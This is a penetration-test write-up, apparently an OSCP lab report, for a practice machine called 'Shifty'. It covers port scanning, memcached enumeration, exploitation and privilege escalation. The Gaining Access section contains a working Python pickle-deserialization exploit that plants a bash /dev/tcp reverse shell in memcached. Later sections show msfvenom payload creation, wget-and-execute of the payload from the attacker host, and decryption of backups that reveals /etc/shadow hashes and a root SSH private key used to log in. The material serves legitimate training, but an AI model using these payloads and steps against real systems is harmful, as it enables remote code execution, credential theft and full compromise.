# Shifty
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On $Date, $Author performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the $DomainName domain. During the penetration test, $Author was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| $CveIdNumber | $EdbIdNumber |

## Recommendations
$Author recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
$Author used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of $Author's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, $Author was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: shifty
* Description: A tricky machine, which requires you to put two and two together.
* IP Address: 192.168.186.59 
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: Linux (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Mon Aug 30 22:18:29 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/shift-nmap-complete 192.168.186.59
Nmap scan report for 192.168.186.59
Host is up (0.076s latency).
Not shown: 65535 open|filtered ports, 65530 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
5000/tcp  open   upnp
11211/tcp open   memcache

# Nmap done at Mon Aug 30 22:23:02 2021 -- 1 IP address (1 host up) scanned in 273.64 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Mon Aug 30 22:37:49 2021 as: nmap -sV -sC -pT:22,53,80,5000,11211 -oN scans/shifty-nmap-versions 192.168.186.59
Nmap scan report for 192.168.186.59
Host is up (0.081s latency).

PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 54:d8:d1:1a:e4:8c:66:48:37:ba:89:0a:9b:aa:db:47 (RSA)
|   256 fb:75:84:86:ec:b5:00:f3:4f:cb:c8:f2:18:85:42:b7 (ECDSA)
|_  256 2f:fd:b2:b1:6c:02:e8:a0:ba:e7:f7:52:80:3f:de:a3 (ED25519)
53/tcp    closed domain
80/tcp    open   http      nginx 1.10.3
|_http-generator: Gatsby 2.22.15
|_http-server-header: nginx/1.10.3
|_http-title: Gatsby + Netlify CMS Starter
5000/tcp  open   http      Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Hello, world!
11211/tcp open   memcached Memcached 1.4.33 (uptime 14252 seconds)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 30 22:38:00 2021 -- 1 IP address (1 host up) scanned in 10.43 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Mon Aug 30 22:53:17 2021 as: nmap -O -oN scans/shifty-nmap-os 192.168.186.59
Nmap scan report for 192.168.186.59
Host is up (0.076s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
53/tcp   closed domain
80/tcp   open   http
5000/tcp open   upnp
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 4.4 (93%), Linux 3.16 (90%), Linux 3.13 (90%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (88%), Linux 2.6.32 (88%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), WatchGuard Fireware 11.8 (88%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 30 22:53:29 2021 -- 1 IP address (1 host up) scanned in 11.49 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### SSH
TCP port 22.
```bash
# scan results go here
```

### HTTP
TCP port 80.
```bash
dirb http://192.168.186.59 -r -o scans/shifty-dirb-80-big

# output
---- Scanning URL: http://192.168.186.59/ ----
==> DIRECTORY: http://192.168.186.59/404/                                                                                             
==> DIRECTORY: http://192.168.186.59/about/                                                                                           
==> DIRECTORY: http://192.168.186.59/admin/                                                                                           
==> DIRECTORY: http://192.168.186.59/blog/                                                                                            
==> DIRECTORY: http://192.168.186.59/contact/                                                                                         
==> DIRECTORY: http://192.168.186.59/img/                                                                                             
+ http://192.168.186.59/index.html (CODE:200|SIZE:58936)                                                                              
==> DIRECTORY: http://192.168.186.59/products/                                                                                        
==> DIRECTORY: http://192.168.186.59/static/                                                                                          
==> DIRECTORY: http://192.168.186.59/tags/ 
```

```bash
# Dirsearch started Mon Aug 30 23:01:30 2021 as: dirsearch.py -u 192.168.186.59 -o /home/victor/oscp/pg/labs/shifty/scans/shifty-dirsearch-80-common

301   185B   http://192.168.186.59:80/404    -> REDIRECTS TO: http://192.168.186.59/404/
200    38KB  http://192.168.186.59:80/404.html
301   185B   http://192.168.186.59:80/about    -> REDIRECTS TO: http://192.168.186.59/about/
301   185B   http://192.168.186.59:80/admin    -> REDIRECTS TO: http://192.168.186.59/admin/
200   493B   http://192.168.186.59:80/admin/
200   493B   http://192.168.186.59:80/admin/?/login
200   493B   http://192.168.186.59:80/admin/index.html
301   185B   http://192.168.186.59:80/blog    -> REDIRECTS TO: http://192.168.186.59/blog/
200    46KB  http://192.168.186.59:80/blog/
301   185B   http://192.168.186.59:80/contact    -> REDIRECTS TO: http://192.168.186.59/contact/
301   185B   http://192.168.186.59:80/img    -> REDIRECTS TO: http://192.168.186.59/img/
200    58KB  http://192.168.186.59:80/index.html
200    72B   http://192.168.186.59:80/manifest.json
301   185B   http://192.168.186.59:80/products    -> REDIRECTS TO: http://192.168.186.59/products/
301   185B   http://192.168.186.59:80/static    -> REDIRECTS TO: http://192.168.186.59/static/
301   185B   http://192.168.186.59:80/tags    -> REDIRECTS TO: http://192.168.186.59/tags/
```

```bash
- Nikto v2.1.6/2.1.5
Target Host: 192.168.186.59
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```

### HTTP
TCP port 5000.
```bash
curl http://http://192.168.186.59:5000/

# output
<p>Register functionality is on its way, for now please login with admin:admin for testing purposes</p>
```

```bash
dirb http://192.168.186.59:5000 -o scans/shifty-dirb-5000-common

# output
---- Scanning URL: http://192.168.186.59:5000/ ----
+ http://192.168.186.59:5000/admin (CODE:302|SIZE:209)
+ http://192.168.186.59:5000/login (CODE:200|SIZE:1572)
+ http://192.168.186.59:5000/logout (CODE:302|SIZE:209)
```

```bash
# Dirsearch started Mon Aug 30 23:36:19 2021 as: dirsearch.py -u 192.168.186.59:5000 -o /home/victor/oscp/pg/labs/shifty/scans/shift-dirsearch-5000-common

302   209B   http://192.168.186.59:5000/admin    -> REDIRECTS TO: http://192.168.186.59:5000/
200     2KB  http://192.168.186.59:5000/login
302   209B   http://192.168.186.59:5000/logout    -> REDIRECTS TO: http://192.168.186.59:5000/
```

```bash
cd exploits/
searchsploit -m 43905
sudo nc -nvlp 5000
python 43905.py 192.168.186.59 5000 192.168.49.186 5000

# output
[-] Debug is not enabled
```

```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.186.59
+ Target Port: 5000
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OPTIONS Allowed HTTP Methods: HEAD, OPTIONS, GET 
```

### Memcached
TCP port 11211.
```bash
# Nmap 7.91 scan initiated Mon Aug 30 23:21:23 2021 as: nmap -p 11211 --script memcached-info -oN scans/shifty-nmap-scripts-memcached-info 192.168.186.59
Nmap scan report for 192.168.186.59
Host is up (0.10s latency).

PORT      STATE SERVICE
11211/tcp open  memcache
| memcached-info: 
|   Process ID: 524
|   Uptime: 16860 seconds
|   Server time: 2021-03-10T23:37:32
|   Architecture: 64 bit
|   Used CPU (user): 1.440000
|   Used CPU (system): 1.220000
|   Current connections: 1
|   Total connections: 2578
|   Maximum connections: 1024
|   TCP Port: 11211
|   UDP Port: 0
|_  Authentication: no

# Nmap done at Mon Aug 30 23:21:24 2021 -- 1 IP address (1 host up) scanned in 0.79 seconds
```

```bash
telnet 192.168.186.59 11211
```

```bash
stats slabs

# output
STAT 3:chunk_size 152
STAT 3:chunks_per_page 6898
STAT 3:total_pages 3
STAT 3:total_chunks 20694
STAT 3:used_chunks 18249
STAT 3:free_chunks 2445
STAT 3:free_chunks_end 0
STAT 3:mem_requested 2481864
STAT 3:get_hits 15
STAT 3:cmd_set 18264
STAT 3:delete_hits 0
STAT 3:incr_hits 0
STAT 3:decr_hits 0
STAT 3:cas_hits 0
STAT 3:cas_badval 0
STAT 3:touch_hits 0

STAT 4:chunk_size 192
STAT 4:chunks_per_page 5461
STAT 4:total_pages 1
STAT 4:total_chunks 5461
STAT 4:used_chunks 3
STAT 4:free_chunks 5458
STAT 4:free_chunks_end 0
STAT 4:mem_requested 480
STAT 4:get_hits 57
STAT 4:cmd_set 60
STAT 4:delete_hits 0
STAT 4:incr_hits 0
STAT 4:decr_hits 0
STAT 4:cas_hits 0
STAT 4:cas_badval 0
STAT 4:touch_hits 0
STAT active_slabs 2
STAT total_malloced 4194000
END
```

```bash
stats items

# output 
STAT items:3:number 18249 # <-- LOOK 
STAT items:3:age 34053
STAT items:3:evicted 0
STAT items:3:evicted_nonzero 0
STAT items:3:evicted_time 0
STAT items:3:outofmemory 0
STAT items:3:tailrepairs 0
STAT items:3:reclaimed 0
STAT items:3:expired_unfetched 0
STAT items:3:evicted_unfetched 0
STAT items:3:crawler_reclaimed 0
STAT items:3:crawler_items_checked 0
STAT items:3:lrutail_reflocked 0

STAT items:4:number 3 # <-- LOOK
STAT items:4:age 803
STAT items:4:evicted 0
STAT items:4:evicted_nonzero 0
STAT items:4:evicted_time 0
STAT items:4:outofmemory 0
STAT items:4:tailrepairs 0
STAT items:4:reclaimed 0
STAT items:4:expired_unfetched 0
STAT items:4:evicted_unfetched 0
STAT items:4:crawler_reclaimed 0
STAT items:4:crawler_items_checked 0
STAT items:4:lrutail_reflocked 0
END
```

```bash
stats cachedump 3 0

# output
# ...snipped...
ITEM session:2b8e8504-22dd-464d-aef8-c43771d54d1c [26 b; 1633058238 s]
ITEM session:910ece3c-90fe-45cc-8033-9f4f0c1655d6 [26 b; 1633058237 s]
ITEM session:655626f7-a71f-4247-8f1f-c15d3a82d0dd [26 b; 1633058237 s]
ITEM session:7b018a4a-c9f7-4d2a-bb6d-ebef3ddc95d8 [26 b; 1633058237 s]
ITEM session:ba3b2566-b009-46ba-aced-ba370afa214d [26 b; 1633058237 s]
ITEM session:79e47081-ffb0-4437-8e42-affb1b345ee7 [26 b; 1633058237 s]
ITEM session:2ab21863-ee87-4052-a418-f3cb5b144242 [26 b; 1633058237 s]
ITEM session:e3abafc3-085e-41c9-ab6e-fbab119ee7b1 [26 b; 1633058236 s]
ITEM session:542f0852-58fb-4e84-bdfb-19734c2a5eb2 [26 b; 1633058236 s]
ITEM session:3c36f312-50f3-41be-ad44-be72a1b22dfd [26 b; 1633058236 s]
ITEM session:62c7bc30-4068-4862-8b51-f923ddbdc6f9 [26 b; 1633058236 s]
ITEM session:715cea44-3aad-4aad-b38f-9c93f582d9fd [26 b; 1633058236 s]
ITEM session:07305969-978c-486e-bf8f-08227f504b6d [26 b; 1633058236 s]
ITEM session:8c735f51-5595-4fbc-ae5f-7fce532a11da [26 b; 1633058236 s]
ITEM session:85b53cf6-1f5a-4d87-92b1-99c73d118a44 [26 b; 1633058235 s]
ITEM session:43ed04df-cd45-4274-9e38-8934553379a3 [26 b; 1633058235 s]
ITEM session:7ce105b5-3dad-4ca1-9509-5740c4352312 [26 b; 1633058235 s]
ITEM session:855c3165-4fbb-4541-8633-a49bb0c61203 [26 b; 1633058235 s]
ITEM session:7d6c329a-b89a-4c12-91cc-12d8431fa0a5 [26 b; 1633058235 s]
ITEM session:5211dbad-551a-411b-ad7e-67d69c4040f6 [26 b; 1633058235 s]
ITEM session:03739074-1520-4a31-8dfc-b1945873eb30 [26 b; 1633058234 s]
# ...snipped...
```

```bash
stats cachedump 4 0

# output
ITEM session:b01ad732-f640-4055-a4e2-1c32d70a9459 [50 b; 1633088328 s]
ITEM session:a784b373-22b2-4eeb-9b60-034edb33512e [50 b; 1633087991 s]
ITEM session:90aa1cb6-5dac-40ab-b5c6-06183b77007b [50 b; 1633087485 s]
```
```bash
quit
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, $Author was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Credentials
* Application
  * admin:admin

```bash
sudo apt install libmemcached-tools
pyenv global 3.9.5
pip install pymemcache
```

```bash
#!/usr/bin/env python

import pickle
import os
from pymemcache.client.base import Client
from pymemcache.exceptions import (
    MemcacheError,
    MemcacheClientError,
    MemcacheServerError,
    MemcacheUnknownError,)
 
MC_ERR = (MemcacheError, MemcacheClientError, MemcacheServerError, MemcacheUnknownError)
 
# Modify as you deemed fit.
victim = "192.168.161.59"
attacker = "192.168.49.161"
attacker_port = 11211
 
class RCE:
    def __reduce__(self):
        # reverse shell command string
        cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{attacker}/{attacker_port} 0>&1'"
        # __reduce__ returns a tuple of callable and tuple of arguments of the callable
        return os.system, (cmd,)
  
if __name__ == '__main__':
    try:
        # create a memcache client object
        mc = Client(f"{victim}:11211")
        # Set a key you_have_been_pwned with serialized data of the reverse shell command.
        mc.set("session:you_have_been_pwned", pickle.dumps(RCE()))
    except MC_ERR as e:
        print(e)
```

```bash
sudo nc -nvlp 11211
```

```bash
python exploit.py
```

```bash
memmcat --server=192.168.186.59 "session:you_have_been_pwned"
```

```bash
curl http://192.168.186.59:5000 "session=you_have_been_pwned" # firefox
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. $Author added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.186 LPORT=5000 -f elf -o rshell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rshell.elf

sudo python3 -m http.server 80

sudo nc -nvlp 5000

wget http://192.168.49.186/rshell.elf -O /tmp/rshell.elf
chmod +x /tmp/rshell.elf
/tmp/rshell.elf
```

```bash
id

# output
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

```bash
cat /etc/passwd | grep bash

# output
root:x:0:0:root:/root:/bin/bash
jerry:x:1000:1000:jerry,,,:/home/jerry:/bin/bash
```

### Privilege Escalation
```bash
ls -al /opt/backups

# output
total 48
drwxr-xr-x 4 root root  4096 Jun  2  2020 .
drwxr-xr-x 3 root root  4096 Jun  2  2020 ..
drwxr-xr-x 2 root root  4096 Jun  2  2020 __pycache__
-rwxr-xr-x 1 root root   929 Jun  2  2020 backup.py
drwxr-xr-x 2 root root  4096 Jun  2  2020 data
-rw-r--r-- 1 root root 27514 Jun  1  2020 des.py
```

```python
# vim backup.py

import sys
import os
import hashlib
from des import des, CBC, PAD_PKCS5

def backup(name, file):
    dest_dir = os.path.dirname(os.path.realpath(__file__)) + '/data'
    dest_name = hashlib.sha224(name.encode('utf-8')).hexdigest()
    with open('{}/{}'.format(dest_dir, dest_name), 'wb') as dest:
        data = file.read()
        k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
        cipertext = k.encrypt(data)
        dest.write(cipertext)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: {} <file>'.format(sys.argv[0]))
    
    FILENAME = sys.argv[1]
    FILENAME = os.path.abspath(FILENAME)
    print('Backing up "{}"'.format(FILENAME))
    f = None
    try:
        f = open(FILENAME, 'rb')
        backup(FILENAME, f)
    except Exception as e:
        print('Could not open {}'.format(FILENAME))
        print(e)
    finally:
        if f:
            f.close()
```

```bash
python /opt/backups/backup.py /etc/shadow

# output
Backing up "/etc/shadow"
Could not open /etc/shadow
[Errno 13] Permission denied: '/etc/shadow'
```

```bash
vim backup2.py
```
```python
import sys
import os
import hashlib
from des import des, CBC, PAD_PKCS5

def backup(name, file):
    dest_dir = os.path.dirname(os.path.realpath(__file__)) + '/data'
    dest_name = hashlib.sha224(name.encode('utf-8')).hexdigest()
    with open('{}/{}'.format(dest_dir, dest_name), 'wb') as dest:
        data = file.read()
        k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
        plaintext = k.decrypt(data)
        print("[+] --------------------")
        print(plaintext)
        print("[+] --------------------")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: {} <file>'.format(sys.argv[0]))
    
    FILENAME = sys.argv[1]
    FILENAME = os.path.abspath(FILENAME)
    print('Backing up "{}"'.format(FILENAME))
    f = None
    try:
        f = open(FILENAME, 'rb')
        backup(FILENAME, f)
    except Exception as e:
        print('Could not open {}'.format(FILENAME))
        print(e)
    finally:
        if f:
            f.close()
```

```bash
cp -R /opt/backup/* /tmp/
cd /tmp/
ls data

# output
0317ce62a75684cf0fcf8452a7fe5e5e919d1b730644bf16a304a919
11e3e83c5ea13aaed3b3ceb5edd72b9431ebc6ec2c447d412a0b7c7c
1a171f6f6491d3e4ca9cc0ca15a6c508c8815f6e29004bb29c0724d5
1cb607653518c3b1f08b1341322ead36dd8f93c3d2bfa23916fe28bd
1fd8c1281b186594d3d49f38cded4ce40faf862e9d409eb2a3a201cf
25a74de564e2aa81fbb8682f3fef798deda63f4cca65fd58901caecb
2a375cd079053698fc2db9ff919abaf743b984d7fef91c575174c211
31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
3d1d1fce12fb9da458b96d052aabcb3a592319461d5e0625a778db24
3fa4dcd297e960dc9e875437c67e7817356c487f57f828453756a2cc
403c9401a0224bd4f483dedb33ed0bf37fbd93881783ea0e600a49ff
5b1c7de10787e87d4d868457b7bf828154f1d02f653f2b57bce17abc
65895ecf8b82b9fa742e8fabde0fd7e60f1258a9e7ba3c1e9367a3e0
7297aeb420d0530ccb52dcb7f905ecc8deffefc32d02691561a9172e
7824132f0f0cc6da1dce3763d50c38c2941d07f9648e34c6c9b9ccf8
8cd58cbefd50ef93f1a3b173456f9b6a09a7318ada378c3a49a980f2
8f0039a8674bfca67f0cbb68c8ff318c13cf28c3823a6e31c10fd8e4
9038291aaa6b222363fc78837b934d1e2f96bb7cfe11fd3d73149e72
92e8127d493e205bfbd8a9c0dd165da2154768cebafa1c752d9bf0dc
c968ecfcb29461857288f04bc9e7884b828a91620e3446d5f337d96c
dd533e5634f95c6d86a4f37f01453f5326c80e58b8a01f0a4222c011
dfe0444a971a789bb405c54c270ae25460f5699319aad697c7fd35ee
e2fdf63978c691bf7dd9d0af06bf0bd72c37615837db57e28e8c4bba
f166b490169e7de5795a09305837198579daad4694e233d49b126d91
```

```bash
for LINE in $(cat data.txt); do echo "python backup2.py data/$LINE"; done

# output
python backup2.py data/0317ce62a75684cf0fcf8452a7fe5e5e919d1b730644bf16a304a919
python backup2.py data/11e3e83c5ea13aaed3b3ceb5edd72b9431ebc6ec2c447d412a0b7c7c
python backup2.py data/1a171f6f6491d3e4ca9cc0ca15a6c508c8815f6e29004bb29c0724d5
python backup2.py data/1cb607653518c3b1f08b1341322ead36dd8f93c3d2bfa23916fe28bd
python backup2.py data/1fd8c1281b186594d3d49f38cded4ce40faf862e9d409eb2a3a201cf
python backup2.py data/25a74de564e2aa81fbb8682f3fef798deda63f4cca65fd58901caecb
python backup2.py data/31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
python backup2.py data/3fa4dcd297e960dc9e875437c67e7817356c487f57f828453756a2cc
python backup2.py data/403c9401a0224bd4f483dedb33ed0bf37fbd93881783ea0e600a49ff
python backup2.py data/5b1c7de10787e87d4d868457b7bf828154f1d02f653f2b57bce17abc
python backup2.py data/65895ecf8b82b9fa742e8fabde0fd7e60f1258a9e7ba3c1e9367a3e0
python backup2.py data/7297aeb420d0530ccb52dcb7f905ecc8deffefc32d02691561a9172e
python backup2.py data/7824132f0f0cc6da1dce3763d50c38c2941d07f9648e34c6c9b9ccf8
python backup2.py data/8cd58cbefd50ef93f1a3b173456f9b6a09a7318ada378c3a49a980f2
python backup2.py data/9038291aaa6b222363fc78837b934d1e2f96bb7cfe11fd3d73149e72
python backup2.py data/92e8127d493e205bfbd8a9c0dd165da2154768cebafa1c752d9bf0dc
python backup2.py data/dd533e5634f95c6d86a4f37f01453f5326c80e58b8a01f0a4222c011
python backup2.py data/dfe0444a971a789bb405c54c270ae25460f5699319aad697c7fd35ee
python backup2.py data/e2fdf63978c691bf7dd9d0af06bf0bd72c37615837db57e28e8c4bba
python backup2.py data/f166b490169e7de5795a09305837198579daad4694e233d49b126d91
```

```bash
python backup2.py data/0317ce62a75684cf0fcf8452a7fe5e5e919d1b730644bf16a304a919

# output
root:$6$jper7Hn5$SKBpBAiF8T1My6Ju4a30gVrnADwsbKUH.Z3ViJ/BWqIqVNhU.YZL0ljLfRmK7WRNGFK.LuKCPlBnIW3B/h2n9.:18408:0:99999:7:::
# ...snipped...
jerry:$6$1gpf0S3D$WXA0bEA7zI.WLwnZ26ePrZ4f.nG0tyB/miajWs8UyDBZupzto6pA7oQD2a.4yKMxEk0Uwh9RvKnnTIYCt3Hjh.:18408:0:99999:7:::
```

```bash
python backup2.py data/31328fa57f5c504df041f7f4f45498c766c0d12

# output
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsw9sPBI6js7DDqEruZrZn6kaDLV3sttQfZdz9DOn6KKbP82u
6VXlmC28TzwrSPPhQBYH0BjSQsrU7KiYvjFbPm0XTx4vXuaE132gLeBTFyGiixTb
iZ5v76nEx2CVWNNNzMt7MDDkIfJaj0EBntVChwVOD74x6uSdQz0LznKDE320bd55
g9tvecbeAQGSEkag7o79aAbeQUBhDhYPak7jeM7p9zeXjxmh16qXELL7uCtmEkr+
GuaHzTMyuD1oJ4CtsLfb5OwrJKu+V1/ruIVs+zFye0I2qeJZLHSZRU2bxU6QYqPd
PB3jEBqfGeEWqL6IwPrZcNsxsX/z8qTG4a2oAQIDAQABAoIBAQCwZMQaFVcMcdEj
60/4wvwZ1essk+P8FSMg5f87lVuWyAEqhIQHpy/Lj1qPr9VwQ5glms5NiPYxCEFj
dd8qldKuF6e7sB+4XFyHMGGIcBFKmz7VxlFTK/pXXaXVR2c4nshotBeB7NgAPRBL
SR3Ai5PDEU3KInJoVJg7sbqcwKAxpKA79O5vEIKBs7kqsXx3c+oLYre9Lqybu/jI
Bf18qyXVB2fqyFc94rhKn7eDi1or+VopPC3h81kRAG/aFSqKJ6PtyZYZSYQ5qI1S
SgR+7z2RwWuJVb7VfxBWZCWWR0uqsJ/7Vz3A8c9AA+41LribppBCFv5fjSaefxkw
MH1pmY+VAoGBAOUMsU6zj/WHfNVxerJtdzfrDqbA1kDI3RE/Cf42LmWjTwin7cdM
7lxtZXoYkoaU6v19U4szSw9uAEROfM33TPqlw0Vj7YwPGjpsQK9UtAJgpLgebUEP
yN7OqocGe/wYMVQq6R1FgWoRJKxPCvZfiD+q9fLE7lbZk+PfqaDv25FbAoGBAMgg
+n9xnvVS+Qgwsw/HMfz1quOWC+jiMrg5u55L1SRbiylUZQDJxcSnh2pZk718eK/J
knYq54wZ/dhgTZiNp3DFHxqLASEfqS0NcZ1aJ+FoBk8fpaY/ogeaPtb9t8xfW83Y
ZnTURR4Z9JRbDXU7XWAN14FQWY6tL5SJL6pcC67TAoGAYnBwC4j0h+tw5TLeLq0J
HckyBMy/yBwLlovnOZADpL7pCqlRceRIVQTXJgBFiP2beNJSA3NKARmfl7u7u7Fb
LiXrpHjr8NPUy+MWccQPkS4D3PWGsv2bsNZVR66rvo6PNMM0aNYkZndzsXJPHc+0
+Nf62Bl27XCZNMg9WON9FB0CgYEAsaXMltqGDyDjHKkWGfhpYDG2yyVDVyuLeEsP
R3nrLsXwJvTaX7O8UU+g/f+cDMTz4J8e2rRFK/FaivsZhkSgEJN6g7ZGf1+6bdqU
Muh3pDgR+aSPB59Otk7uXyuDPvCa7oOclzJiVFEX8aVNsfXLclt3JDvt85+6L7ED
Vcc1O68CgYAT0N7/NbLIjo2StLTM0rWV//r1MAQVI5Gf4ojxqOdB4xakQ5yY8NE3
mfQ1gbw9JPJZXd5t+Gp+V7khi+a1o6wyPj6275FnZSDVjR8g6Eu/gdmX4DhrlZeI
NVj4W5FJ2JbmGWk7p2nETq2q1wNveMGZCcTNHskoqZZsk7aLq5v5Yw==
-----END RSA PRIVATE KEY-----
```

```bash
python backup2.py data/1a171f6f6491d3e4ca9cc0ca15a6c508c8815f6e29004bb29c0724d5

# output
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzD2w8EjqOzsMOoSu5mtmfqRoMtXey21B9l3P0M6foops/za7pVeWYLbxPPCtI8+FAFgfQGNJCytTsqJi+MVs+bRdPHi9e5oTXfaAt4FMXIaKLFNuJnm/vqcTHYJVY003My3swMOQh8lqPQQGe1UKHBU4PvjHq5J1DPQvOcoMTfbRt3nmD2295xt4BAZISRqDujv1oBt5BQGEOFg9qTuN4zun3N5ePGaHXqpcQsvu4K2YSSv4a5ofNMzK4PWgngK2wt9vk7Cskq75XX+u4hWz7MXJ7Qjap4lksdJlFTZvFTpBio908HeMQGp8Z4RaovojA+tlw2zGxf/PypMbhragB root@shifty
```

```bash
vim key # copy/paste recovered RSA private key
chmod go-r key
ssh -i key root@192.168.186.59

# output
Linux shifty 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1+deb9u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 27 13:24:23 2020
root@shifty:~# 
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, $Author removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Lessons Learned
* Use multiple tools
